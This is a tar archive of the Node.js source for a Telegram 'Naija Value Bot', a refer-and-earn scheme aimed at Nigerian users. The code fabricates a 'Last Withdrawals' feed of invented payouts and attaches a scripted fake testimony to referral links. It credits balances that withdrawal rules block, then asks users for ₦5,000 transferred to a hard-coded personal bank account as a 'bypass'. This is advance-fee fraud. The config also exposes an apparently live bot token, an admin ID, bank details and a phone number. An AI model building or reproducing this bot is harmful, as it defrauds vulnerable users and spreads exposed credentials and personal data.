variables.js                                                                                        0000644 0000000 0000000 00000001361 14764615064 011570  0                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        export default {
  BOT_TOKEN: "7805051781:AAF-LPcdZJfglbqn8dRSJgwLCoDyFCdBWOY",
  CHANNEL_LINK: "https://t.me/+2xBxdMgCf2Q0M2Jk",
  BRANDING: "Naija Value Bot",
  INITIAL_TOTAL_WITHDRAWALS: 0,
  INITIAL_TOTAL_AMOUNT_WITHDRAWN: 0,
  DAILY_BONUS: 500,
  // WITHDRAWAL_THRESHOLD is not used now; withdrawals depend on referrals/bypass.
  REFERRAL_BONUS: 1500,
  CUSTOMER_SERVICE_AGENTS: [ "AGENT_ID1", "AGENT_ID2" ],
  ADMIN_ID: "75788555",
  NIGERIA_NAMES: [ "Chinedu", "Aisha", "Segun", "Ngozi", "Emeka" ],
  // The payment details image is generated using dummyimage.com.
  PAYMENT_DETAILS_IMAGE: "https://dummyimage.com/400x200/000/fff.png&text=ACC%3A+9030057318%0ABANK%3A+Pamplay%0ANAME%3A+Michael+Junior+Michael",
  BOT_USERNAME: "naijavalue_bot"
};
                                                                                                                                                                                                                                                                               package.json                                                                                        0000644 0000000 0000000 00000000664 14764501042 011543  0                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        {
  "name": "naijavalue-bot",
  "version": "1.0.0",
  "description": "Naija Value Telegram Bot with full command support, animated loading, support chat mode, and persistent storage",
  "main": "index.js",
  "type": "module",
  "scripts": {
    "start": "node index.js"
  },
  "author": "argovesta",
  "license": "MIT",
  "dependencies": {
    "lowdb": "^3.0.0",
    "node-fetch": "^2.6.7",
    "node-telegram-bot-api": "^0.57.0"
  }
}
                                                                            index.js                                                                                            0000644 0000000 0000000 00000056572 14764616002 010736  0                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        /*
 * VESTADEVELOPMENT – Receptive Statement
 * This file is the complete bot source code.
 */

import TelegramBot from 'node-telegram-bot-api';
import { Low, JSONFile } from 'lowdb';
import path from 'path';
import { fileURLToPath } from 'url';
import vars from './variables.js';

// Determine __dirname.
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Initialize persistent storage.
const adapter = new JSONFile(path.join(__dirname, 'db.json'));
const db = new Low(adapter);
async function initDB() {
  await db.read();
  db.data = db.data || { users: {}, supportRequests: {} };
  await db.write();
}
await initDB();

// Global flag.
let testMode = false;

// Initialize the bot.
const bot = new TelegramBot(vars.BOT_TOKEN, {
  polling: { interval: 300, autoStart: true, params: { timeout: 10 } }
});
bot.on('polling_error', err => console.error(stylize("Polling error:"), err));

// Print startup branding.
console.log(
  "┌" + "═".repeat(60) + "┐\n" +
  "│ " + stylize("🤖 BOT BY ARGO VESTA DEVELOPMENT").padEnd(58, " ") + " │\n" +
  "│ " + stylize("📞 CONTACT DEVELOPER: +2348121320468").padEnd(58, " ") + " │\n" +
  "│ " + stylize("🙏 THANKS").padEnd(58, " ") + " │\n" +
  "└" + "═".repeat(60) + "┘"
);

/* Stylize helper using mathematical bold characters. */
function stylize(text) {
  const mapping = {
    'A': '𝐀', 'B': '𝐁', 'C': '𝐂', 'D': '𝐃', 'E': '𝐄', 'F': '𝐅', 'G': '𝐆', 'H': '𝐇', 'I': '𝐈', 'J': '𝐉',
    'K': '𝐊', 'L': '𝐋', 'M': '𝐌', 'N': '𝐍', 'O': '𝐎', 'P': '𝐏', 'Q': '𝐐', 'R': '𝐑', 'S': '𝐒', 'T': '𝐓',
    'U': '𝐔', 'V': '𝐕', 'W': '𝐖', 'X': '𝐗', 'Y': '𝐘', 'Z': '𝐙',
    'a': '𝐚', 'b': '𝐛', 'c': '𝐜', 'd': '𝐝', 'e': '𝐞', 'f': '𝐟', 'g': '𝐠', 'h': '𝐡', 'i': '𝐢', 'j': '𝐣',
    'k': '𝐤', 'l': '𝐥', 'm': '𝐦', 'n': '𝐧', 'o': '𝐨', 'p': '𝐩', 'q': '𝐪', 'r': '𝐫', 's': '𝐬', 't': '𝐭',
    'u': '𝐮', 'v': '𝐯', 'w': '𝐰', 'x': '𝐱', 'y': '𝐲', 'z': '𝐳'
  };
  return text.split('').map(ch => mapping[ch] || ch).join('');
}

/* Global objects. */
const conversationState = {};
let supportSessions = {};

/* Tap & Earn cooldown (1 minute per user). */
function canTap(user) {
  if (!user.lastTap) return true;
  if (!(user.lastTap instanceof Date)) {
    user.lastTap = new Date(user.lastTap);
  }
  const now = new Date();
  const diff = (now.getTime() - user.lastTap.getTime()) / 1000;
  return diff >= 60;
}
function updateLastTap(user) {
  user.lastTap = new Date();
}

const motivationalQuotes = [
  "No condition is permanent. 😌 – Chinua Achebe",
  "Even the best cooking pot will not produce food. 🍲 – African proverb",
  "If you want to go fast, go alone; if you want to go far, go together. 🚶‍♂️🚶‍♀️ – African proverb",
  "Rain does not fall on one roof alone. ☔ – Nigerian proverb",
  "A man who uses force is afraid of reasoning. 💢 – Nigerian proverb"
];

/* Business-themed images from picsum.photos. */
const businessImages = vars.BUSINESS_IMAGES || [
  "https://picsum.photos/800/600?random=11",
  "https://picsum.photos/800/600?random=22",
  "https://picsum.photos/800/600?random=33"
];

/* Support/Agent functions. */
let lastAssignedAgentIndex = -1;
function getNextAgent() {
  const agents = vars.CUSTOMER_SERVICE_AGENTS;
  const total = agents.length;
  for (let i = 1; i <= total; i++) {
    const idx = (lastAssignedAgentIndex + i) % total;
    const agent = agents[idx];
    if (agent && agent.trim() !== "") {
      lastAssignedAgentIndex = idx;
      return agent;
    }
  }
  return null;
}
async function startSupportSession(userId, message) {
  try {
    const agentId = getNextAgent();
    if (agentId) {
      supportSessions[userId] = { agent: agentId };
      await bot.sendMessage(agentId, stylize(`Support Request\n👤 User: ${userId}\n💬 Message: ${message}\n👉 To accept, use /verify_support ${userId}`));
      await bot.sendMessage(userId, stylize("Customer Service\n⌛ Your support request is being connected..."));
    } else {
      await bot.sendMessage(userId, stylize("Customer Service\n😞 All our agents are busy. Please try again later."));
    }
  } catch (err) {
    console.error(stylize("Error in support session:"), err);
  }
}

/* Fake "Last Withdrawals" generator. */
function generateLastWithdrawal() {
  const names = vars.NIGERIA_NAMES || [
    "Chinedu", "Aisha", "Segun", "Ngozi", "Emeka",
    "Ifeoma", "Babatunde", "Yetunde", "Kehinde", "Uchechi",
    "Tunde", "Ifeanyi", "Kemi", "Adebayo", "Bola",
    "Chioma", "Ijeoma", "Obinna", "Funke", "Nonso"
  ];
  const name = names[Math.floor(Math.random() * names.length)];
  const blurredName = name.length <= 2 ? name : name.substring(0, 2) + '***';
  const amount = Math.floor(Math.random() * 95000) + 5000;
  return `${blurredName} has withdrawn ₦${amount}`;
}
function getLastWithdrawals() {
  if (isSaturdayWindow()) {
    return stylize(`Last Withdrawals\n${generateLastWithdrawal()}`);
  } else {
    return stylize(`Last Withdrawals\nWithdrawals are not processed at this time.`);
  }
}

/* Withdrawal status check (button-based; no separate command shown). */
function checkWithdrawalStatus(user) {
  if (testMode && user.id === vars.ADMIN_ID) {
    return stylize("✅ Test mode active: Withdrawal restrictions bypassed.");
  }
  if (user.referrals.length < 30 && !user.bypass) {
    return stylize("⏳ You need 30 referrals to withdraw.");
  }
  if (user.balance <= 0) {
    return stylize("❌ Your wallet is empty. Please top-up your balance first.");
  }
  return stylize("✅ Your withdrawal request will be processed shortly.");
}
function isSaturdayWindow() {
  const now = new Date();
  return now.getDay() === 6 && now.getHours() >= 8 && now.getHours() < 22;
}

/* Payment Account Linking. */
bot.onText(/\/link_payment(?:\s+(.+))?/, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const paymentInfo = match ? match[1] : "";
    if (!paymentInfo) {
      await bot.sendMessage(chatId, stylize("Link Payment\nPlease send your payment account details after the command.\nExample: /link_payment Bank: XYZ, Account: 1234567890"));
      return;
    }
    await db.read();
    if (!db.data.users[chatId]) {
      db.data.users[chatId] = { balance: 0, referrals: [], verified: false, withdrawalCount: 0, transactionHistory: [], lastBonusClaim: null, paymentAccount: null };
    }
    db.data.users[chatId].paymentAccount = paymentInfo;
    await db.write();
    await bot.sendMessage(chatId, stylize(`Payment Linked\n✅ Your payment account has been linked: ${paymentInfo}`));
  } catch (err) {
    console.error(stylize("Error in /link_payment:"), err);
  }
});

/* Admin-only test mode command. */
bot.onText(/\/testmode\s+(on|off)/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    if (chatId.toString() !== vars.ADMIN_ID) return;
    const mode = match[1].toLowerCase();
    testMode = (mode === "on");
    await bot.sendMessage(chatId, stylize(`Test Mode\nTest mode is now ${testMode ? "ON" : "OFF"}.`));
  } catch (err) {
    console.error(stylize("Error in /testmode command:"), err);
  }
});

/* Referral processing. */
async function processReferral(newUserId, referrerId) {
  if (referrerId === newUserId) return;
  await db.read();
  if (!db.data.users[referrerId]) {
    db.data.users[referrerId] = { balance: 0, referrals: [], verified: false, withdrawalCount: 0, transactionHistory: [], lastBonusClaim: null, paymentAccount: null };
  }
  const referrer = db.data.users[referrerId];
  if (!referrer.referrals.includes(newUserId)) {
    referrer.referrals.push(newUserId);
    referrer.balance += vars.REFERRAL_BONUS;
    await db.write();
    await bot.sendMessage(referrerId, `Referral Bonus\n🎉 Someone joined using your referral link! You have been awarded ₦${vars.REFERRAL_BONUS}. Your new balance is ₦${referrer.balance}.`);
  }
}

/* Tap & Earn with 1-minute cooldown. */
async function processTapAndEarn(chatId) {
  await db.read();
  if (!db.data.users[chatId]) {
    db.data.users[chatId] = { balance: 0, referrals: [], verified: false, withdrawalCount: 0, transactionHistory: [], lastBonusClaim: null, paymentAccount: null };
  }
  const user = db.data.users[chatId];
  if (!canTap(user)) {
    const now = new Date();
    const secondsLeft = Math.ceil(60 - ((now.getTime() - user.lastTap.getTime()) / 1000));
    await bot.sendMessage(chatId, stylize(`Tap & Earn\n⏳ Please wait ${secondsLeft} second(s) before tapping again.`));
    return;
  }
  updateLastTap(user);
  const tapMsg = await bot.sendMessage(chatId, stylize("Tap & Earn\n⏳ Tapping..."));
  setTimeout(async () => {
    const bonus = Math.floor(Math.random() * 401) + 100;
    user.balance += bonus;
    user.transactionHistory.push(`Tap & Earn: +₦${bonus}`);
    await db.write();
    try {
      await bot.deleteMessage(chatId, tapMsg.message_id.toString());
    } catch (e) {
      console.error(stylize("Error deleting tap message:"), e);
    }
    await bot.sendMessage(chatId, stylize(`Tap & Earn\n🎉 You tapped and earned ₦${bonus}! Your new balance is ₦${user.balance}.`));
  }, 1500);
}

/* Payment Bypass Instructions (shown only on Saturday withdrawal if referral threshold not met). */
async function sendBypassPaymentDetails(chatId) {
  try {
    await bot.sendPhoto(chatId, vars.PAYMENT_DETAILS_IMAGE, { caption: stylize("💳 Payment Details:\nACC: 9030057318\nBANK: Pamplay\nNAME: Michael Junior Michael") });
  } catch (err) {
    console.error(stylize("Error sending payment details image:"), err);
    await bot.sendMessage(chatId, stylize("💳 Payment Details:\nACC: 9030057318\nBANK: Pamplay\nNAME: Michael Junior Michael"));
  }
  // Provide a button for sending payment screenshot.
  await bot.sendMessage(chatId, stylize("⚠️ ALERT: Please transfer ₦5,000 to the above account, then press the button 'Send Payment Screenshot' to upload your receipt."), {
    reply_markup: { keyboard: [[ "Send Payment Screenshot" ]], resize_keyboard: true }
  });
}

/* Menus for different user types. */
async function sendNormalUserMenu(chatId) {
  const keyboard = [
    ["💰 Balance", "🏧 Withdraw"],
    ["🎁 Daily Bonus", "👤 Profile"],
    ["🔗 Referral", "Last Withdrawals"],
    ["💡 Motivation", "📜 History"],
    ["🛠 Customer Service", "🔗 Link Account"],
    ["Tap & Earn"]
  ];
  await bot.sendMessage(chatId, stylize("Main Menu:"), { reply_markup: { keyboard, resize_keyboard: true } });
}
async function sendAdminMenu(chatId) {
  const keyboard = [
    ["💰 Balance", "🏧 Withdraw"],
    ["🎁 Daily Bonus", "👤 Profile"],
    ["🔗 Referral", "Last Withdrawals"],
    ["💡 Motivation", "📜 History"],
    ["🧑‍💼 Agent Commands", "Admin Dashboard"]
  ];
  await bot.sendMessage(chatId, stylize("Admin Menu:"), { reply_markup: { keyboard, resize_keyboard: true } });
}
async function sendCSMenu(chatId) {
  const keyboard = [
    ["🧑‍💼 Agent Commands", "Customer Chat"],
    ["🔗 Link Account"]
  ];
  await bot.sendMessage(chatId, stylize("Customer Service Menu:"), { reply_markup: { keyboard, resize_keyboard: true } });
}

/* Withdraw Options submenu. */
async function sendWithdrawOptions(chatId) {
  await db.read();
  const user = db.data.users[chatId];
  if (user.referrals.length < 30 && !user.bypass) {
    await sendBypassPaymentDetails(chatId);
    return;
  }
  const keyboard = [
    ["💵 Withdraw All", "✏️ Custom Withdrawal"],
    ["↩️ Back", "Back"]
  ];
  await bot.sendMessage(chatId, stylize("Withdrawal Options:\nSelect an option:"), { reply_markup: { keyboard, resize_keyboard: true } });
}

/* Fused welcome message using business-themed image. */
async function sendFusedStartMessage(chatId) {
  const imageUrl = businessImages[Math.floor(Math.random() * businessImages.length)];
  const caption = stylize("✨ Welcome to Naija Value Bot! ✨\n\n💎 Refer & Earn: Invite friends & earn rewards! 🚀💰\n\nClick below to join our channel.");
  const inlineKeyboard = {
    inline_keyboard: [
      [{ text: "Join Channel 📢", url: vars.CHANNEL_LINK }]
    ]
  };
  try {
    await bot.sendPhoto(chatId, imageUrl, { caption, reply_markup: inlineKeyboard });
  } catch (err) {
    console.error(stylize("Error sending welcome message:"), err);
  }
}

/* /start command. */
bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    if (match && match[1]) {
      const referrerId = match[1].trim();
      processReferral(chatId, referrerId).catch(err => console.error(stylize("Referral error:"), err));
    }
    await bot.sendMessage(chatId, stylize("⏳ Loading..."), { reply_markup: { remove_keyboard: true } });
    await sendFusedStartMessage(chatId);
    await db.read();
    if (!db.data.users[chatId]) {
      db.data.users[chatId] = { balance: 0, referrals: [], verified: false, withdrawalCount: 0, transactionHistory: [], lastBonusClaim: null, paymentAccount: null };
      await db.write();
    }
    if (chatId.toString() === vars.ADMIN_ID) {
      sendAdminMenu(chatId);
    } else if (vars.CUSTOMER_SERVICE_AGENTS.includes(chatId.toString())) {
      sendCSMenu(chatId);
    } else {
      sendNormalUserMenu(chatId);
    }
  } catch (err) {
    console.error(stylize("Error in /start command:"), err);
  }
});

/* Main Message Handler. */
bot.on("message", async (msg) => {
  try {
    const chatId = msg.chat.id;
    const text = (msg.text) ? msg.text.trim() : "";
  
    // Handle "Bypass" command (button) – only available on Saturday.
    if (text.toLowerCase() === "bypass") {
      await db.read();
      const user = db.data.users[chatId];
      if (user.referrals.length >= 30 || user.bypass) {
        await bot.sendMessage(chatId, stylize("Bypass\n✅ You have already met the withdrawal requirement."));
      } else if (isSaturdayWindow()) {
        await bot.sendMessage(chatId, stylize("Bypass Request\n💸 Please transfer ₦5,000 to the account below:"));
        await sendPaymentDetails(chatId);
      } else {
        await bot.sendMessage(chatId, stylize("Bypass\n❌ Bypass option is only available on Saturdays."));
      }
      return;
    }
  
    // Handle photo messages for bypass screenshot.
    if (msg.photo && db.data.users[chatId] && db.data.users[chatId].pendingBypass) {
      try {
        await bot.forwardMessage(vars.ADMIN_ID, chatId, msg.message_id);
        await bot.sendMessage(chatId, stylize("Bypass Confirmation\n📤 Your payment screenshot has been sent to the admin for confirmation. Please wait for approval."));
        db.data.users[chatId].pendingBypass = false;
        await db.write();
      } catch (err) {
        console.error(stylize("Error forwarding bypass screenshot:"), err);
        await bot.sendMessage(chatId, stylize("Error\n❌ Unable to forward your screenshot. Please try again."));
      }
      return;
    }
  
    // Forward support session messages.
    if (supportSessions[chatId] && supportSessions[chatId].agent) {
      const agentId = supportSessions[chatId].agent;
      try {
        await bot.sendMessage(agentId, stylize(`Support Chat\n👤 User ${chatId} says: ${text}`));
      } catch (err) {
        console.error(stylize(`Error forwarding message from ${chatId} to ${agentId}:`), err);
      }
      return;
    }
  
    // Handle conversation states.
    if (conversationState[chatId]) {
      const state = conversationState[chatId];
      if (state === "awaiting_custom_amount") {
        const user = db.data.users[chatId] || {};
        const requestedAmount = parseFloat(text);
        if (isNaN(requestedAmount) || requestedAmount <= 0) {
          await bot.sendMessage(chatId, stylize("Invalid Amount ❌\nPlease enter a valid number:"));
          return;
        }
        if (requestedAmount > user.balance) {
          await bot.sendMessage(chatId, stylize(`Insufficient Funds ❌\nYour balance is ₦${user.balance}.`));
          delete conversationState[chatId];
          return;
        }
        user.balance -= requestedAmount;
        user.withdrawalCount++;
        user.transactionHistory.push(requestedAmount);
        await db.write();
        await bot.sendMessage(chatId, stylize(`Withdrawal Received 💸\n₦${requestedAmount} will be processed shortly.`));
        delete conversationState[chatId];
        return;
      }
      if (state === "awaiting_crypto_details") {
        const user = db.data.users[chatId] || {};
        if (!text) {
          await bot.sendMessage(chatId, stylize("Invalid Input ❌\nPlease provide a valid crypto wallet address:"));
          return;
        }
        user.withdrawalCount++;
        user.transactionHistory.push("Crypto withdrawal to " + text);
        await db.write();
        await bot.sendMessage(chatId, stylize(`Crypto Withdrawal Requested 🪙\nYour request has been recorded.\nWallet: ${text}\nYou will be paid on Saturday after verification.`));
        delete conversationState[chatId];
        return;
      }
      if (state === "withdraw_option") {
        if (text === "↩️ Back" || text === "Back") {
          delete conversationState[chatId];
          await sendNormalUserMenu(chatId);
          return;
        }
        if (text === "💵 Withdraw All") {
          const user = db.data.users[chatId];
          const amount = user.balance;
          user.balance = 0;
          user.withdrawalCount++;
          user.transactionHistory.push(amount);
          await db.write();
          await bot.sendMessage(chatId, stylize(`Withdrawal Received 💸\n₦${amount} will be processed shortly.`));
          if (user.paymentAccount) {
            await bot.sendMessage(vars.ADMIN_ID, stylize(`Payment Request\n👤 User: ${chatId}\n💰 Amount: ₦${amount}\n💳 Payment Account: ${user.paymentAccount}`));
          }
          delete conversationState[chatId];
          return;
        }
        if (text === "✏️ Custom Withdrawal") {
          conversationState[chatId] = "awaiting_custom_amount";
          await bot.sendMessage(chatId, stylize("Custom Withdrawal ✏️\nEnter the amount to withdraw:"));
          return;
        }
      }
    }
  
    // Ensure user is registered.
    await db.read();
    if (!db.data.users[chatId]) {
      db.data.users[chatId] = { balance: 0, referrals: [], verified: false, withdrawalCount: 0, transactionHistory: [], lastBonusClaim: null, paymentAccount: null };
      await db.write();
    }
    const user = db.data.users[chatId];
  
    // Process commands.
    switch (text) {
      case "💰 Balance":
        await bot.sendMessage(chatId, stylize(`Your Balance\n💰 ₦${user.balance}`));
        break;
      case "🏧 Withdraw":
        if (!user.paymentAccount) {
          await bot.sendMessage(chatId, stylize("Link Account Required\nTo withdraw funds, please first link your bank account using /link_payment."));
          break;
        }
        if (!(testMode && chatId.toString() === vars.ADMIN_ID)) {
          if (!isSaturdayWindow()) {
            await bot.sendMessage(chatId, stylize("Withdrawal\n⏳ Withdrawals are processed only on Saturdays (8AM–10PM)."));
            break;
          }
          if (user.balance <= 0) {
            await bot.sendMessage(chatId, stylize("Insufficient Funds ❌\nYour wallet is empty."));
            break;
          }
          if (user.referrals.length < 30 && !user.bypass) {
            // Show Bypass Payment button only on Saturday.
            const bypassKeyboard = { keyboard: [[ "Bypass Payment" ]], resize_keyboard: true };
            await bot.sendMessage(chatId, stylize(`Withdrawal ❌\nYou need 30 referrals to withdraw.`), { reply_markup: bypassKeyboard });
            break;
          }
        }
        conversationState[chatId] = "withdraw_option";
        await sendWithdrawOptions(chatId);
        break;
      case "🎁 Daily Bonus":
        {
          const today = new Date().toDateString();
          if (user.lastBonusClaim === today) {
            await bot.sendMessage(chatId, stylize("Daily Bonus 🎁\nYou have already claimed your bonus today."));
          } else {
            user.balance += vars.DAILY_BONUS;
            user.lastBonusClaim = today;
            await db.write();
            await bot.sendMessage(chatId, stylize(`Daily Bonus 🎉\nYou have received ₦${vars.DAILY_BONUS} bonus!`));
          }
        }
        break;
      case "👤 Profile":
        await bot.sendMessage(chatId, stylize(`Your Profile\n💰 Balance: ₦${user.balance}\n📉 Withdrawals: ${user.withdrawalCount}\n🤝 Referrals: ${user.referrals.length}\n💳 Payment Account: ${user.paymentAccount || "Not linked"}`));
        break;
      case "🔗 Referral":
        {
          await bot.sendChatAction(chatId, "typing");
          const loadingMsg = await bot.sendMessage(chatId, stylize("⏳ Loading referral information..."));
          setTimeout(async () => {
            const referralLink = `https://t.me/${vars.BOT_USERNAME}?start=${chatId}`;
            const testimony = stylize("I've earned amazing profits with Naija Value! 🚀💵 Join now and profit too!");
            const message = `Referral Link: ${referralLink}\nTestimony: ${testimony}`;
            await bot.deleteMessage(chatId, loadingMsg.message_id.toString());
            await bot.sendMessage(chatId, message);
          }, 2000);
        }
        break;
      case "Last Withdrawals":
        {
          const lastWithdrawalsMsg = getLastWithdrawals();
          await bot.sendMessage(chatId, stylize(lastWithdrawalsMsg));
        }
        break;
      case "💡 Motivation":
        {
          const randomIndex = Math.floor(Math.random() * motivationalQuotes.length);
          const quote = motivationalQuotes[randomIndex];
          await bot.sendMessage(chatId, stylize(`Motivation\n💡 ${quote}`));
        }
        break;
      case "🪙 Crypto Withdrawal":
        {
          if (user.referrals.length < 30 && !user.bypass) {
            await bot.sendMessage(chatId, stylize(`Crypto Withdrawal Limit ⚠️\nYou must have at least 30 referrals or click "Bypass Payment" to pay ₦5,000 externally to withdraw.`));
          } else {
            conversationState[chatId] = "awaiting_crypto_details";
            await bot.sendMessage(chatId, stylize("Crypto Withdrawal 🪙\nPlease enter your crypto wallet address:"));
          }
        }
        break;
      case "📜 History":
        {
          const historyContent = user.transactionHistory.length === 0 ?
            stylize("📝 No withdrawal history available.") :
            stylize(user.transactionHistory.map((amt, idx) => `${idx + 1}. ${amt}`).join("\n") + `\nTotal Withdrawals: ${user.withdrawalCount}`);
          await bot.sendMessage(chatId, stylize(`Transaction History\n${historyContent}`));
        }
        break;
      case "🛠 Customer Service":
        await bot.sendMessage(chatId, stylize("Customer Service\n💬 To contact customer service, please use the /support command followed by your message."));
        break;
      case "🔗 Link Account":
        await bot.sendMessage(chatId, stylize("Link Account\n🔗 Please send your payment account details using the command:\n/link_payment Bank: XYZ, Account: 1234567890"));
        break;
      case "🧑‍💼 Agent Commands":
        if (vars.CUSTOMER_SERVICE_AGENTS.includes(chatId.toString()) || chatId.toString() === vars.ADMIN_ID) {
          await bot.sendMessage(chatId, stylize("Agent Commands\n🧑‍💼 Use /verify_support <userId> to connect with a support request."));
        }
        break;
      case "Tap & Earn":
        await processTapAndEarn(chatId);
        break;
      default:
        break;
    }
  } catch (err) {
    console.error(stylize("Error in main message handler:"), err);
  }
});
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      